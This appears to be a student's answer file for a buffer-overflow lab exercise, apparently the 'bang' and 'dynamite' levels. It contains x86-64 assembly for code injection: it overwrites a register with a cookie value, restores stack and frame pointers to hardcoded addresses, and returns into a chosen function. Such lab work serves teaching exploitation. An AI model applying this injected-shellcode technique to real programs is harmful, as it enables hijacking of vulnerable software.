# bang
#Push 0x401020 on to the stack
#pushq $0x401020
#movq $0,%rdx
#movq 0x602320(%rdx),%rax
#movq %rax,0x602308(%rdx)
#retq
#dynamite
movabs $0x7c1295b73bb19611,%rax
movabs $0x7fffffffb350,%rbp
movabs $0x7fffffffb330,%rsp
pushq $0x400ef3
retq
